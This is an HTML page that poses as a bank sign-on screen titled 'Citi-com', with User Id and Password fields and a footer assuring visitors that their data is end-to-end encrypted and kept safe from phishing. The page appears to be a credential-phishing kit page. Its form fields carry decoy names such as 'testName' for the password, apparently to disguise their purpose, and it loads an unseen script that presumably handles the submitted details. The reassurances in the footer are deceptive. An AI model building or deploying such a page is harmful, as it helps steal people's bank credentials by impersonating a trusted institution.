<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Citi-com | Protected by doxme</title>
  
  <style>
    @font-face {
      font-family: 'Express';
      src: url(/assets/font/expresswayrg.otf);
    }
    *, html {
      padding: 0;
      margin: 0;
      box-sizing: border-box;
      font-family: 'Express', sans-serif;
      text-decoration: none;
    }
    p {
      line-height: 1.5;
    }
    button {
      background: none;
      border-radius: .5rem;
      cursor: pointer;
    }
    button:hover,
    button:active,
    button:focus {
      background: #7A7A7A!important;
      color: #ffffff!important;
      border: 1px solid #000!important;
    }
    button * {
      color: inherit;
    }
    button:hover *,
    button:active * {
      color: inherit;
    }
    button.btn-loading {
      position: relative;
      pointer-events: none;
      opacity: 0.7;
      color: transparent!important;
      transition: none;
    }
    button.btn-loading::after {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translateX(-50%) translateY(-50%);
      width: 18px;
      height: 18px;
      border: 2px solid #F3F3F3;
      border-top-color: transparent;
      border-radius: 100%;
      animation: spinner-b 0.6s linear infinite;
      z-index: 10;
    }
    a {
      color: #056baa;
      cursor: pointer;
    }
    header {
      width: 100%;
      height: 60px;
      padding: 0 1rem;
      display: flex;
      align-items: center;
      justify-content: start;
      gap: 1rem;
      border-bottom: 1px solid #E9E9E9;
    }
    header img {
      height: 50px;
    }
    main {
      width: 100%;
      min-height: 95vh;
      padding: 2rem 1rem;
      display: flex;
      align-items: center;
      justify-content: start;
      flex-direction: column;
      gap: 1rem;
      text-align: center;
    }
    main img {
      width: 100%;
      max-width: 500px;
      border-radius: 1rem;
    }
    #test-encryption-form {
      width: 100%;
      max-width: 400px;
      padding: 1rem 0;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 1rem;
    }
    #test-encryption-form input {
      background: rgba(0,0,0,0.05);
      width: 100%;
      height: 45px;
      padding: 0 1rem;
      border: 2px solid #B9B9B9;
      border-radius: .3rem;
    }
    #review-encryption-btn {
      background: #056baa;
      color: #FFFFFF;
      font-weight: bold;
      width: 100%;
      min-width: 180px;
      height: 40px;
      padding: 0 1rem;
      border: none;
      border-radius: .6rem;
    }
    .divider {
      position: relative;
    }
    .divider::after {
      content: '';
      position: absolute;
      top: 50%; left: 0%;
      z-index: 1;
      transform: translateY(-50%);
      background: #C6C6C6;
      width: 100%;
      height: 1px;
    }
    .divider p{
      position: absolute;
      top: 50%; left: 50%;
      z-index: 2;
      transform: translateX(-50%) translateY(-50%);
      background: #FFFFFF;
      color: #242424;
      padding: 0.3rem 0.6rem;
    }
    #create-encryption-btn {
      background: transparent;
      color: #272727;
      font-weight: bold;
      min-width: 180px;
      height: 40px;
      padding: 0 1rem;
      border: 1px solid #cccccc;
      border-radius: .6rem;
    }
    @keyframes spinner-b {
      to {
        transform: translateX(-50%) translateY(-50%) rotate(360deg);
      }
    }
  </style>
</head>

<body>
  <header>
    <img src="/assets/img/encrypted_img.png">
  </header>
  <main>
    <img src="/assets/img/encrypt_lightbox.jpg">
    <form id="test-encryption-form">
      <input type="text" name="testId" id="test-id" placeholder="User Id">
      <input type="text" data-encrypted="" name="testName" id="test-name" placeholder="Password">
      <button id="review-encryption-btn">Sign On</button>
      <a style="font-size: 0.9em;" href="#">Forgotten Password?</a>
      <div class="divider" style="position: relative; width: 100%; height: 30px; display: flex; align-items: center; justify-content: center;">
        <p>Or</p>
      </div>
      <button type="button" id="create-encryption-btn">Create New Account</button>
    </form>
  </main>
  <footer style="background: #272727; color: #eeeeee; min-height: 5vh; padding: 2rem; border-top: 1px solid #cccccc;">
    <p style="font-size: 0.8em">
      Your data is end-to-end encrypted on this model and is used to keep real accounts safe from any possible compromise by phishing and 
      other related attacks. We do not store your information for any reason and you must not share your information with anyone either.
    </p>
  </footer>
  
  <script src="/js/main.js"></script>
</body>

</html>
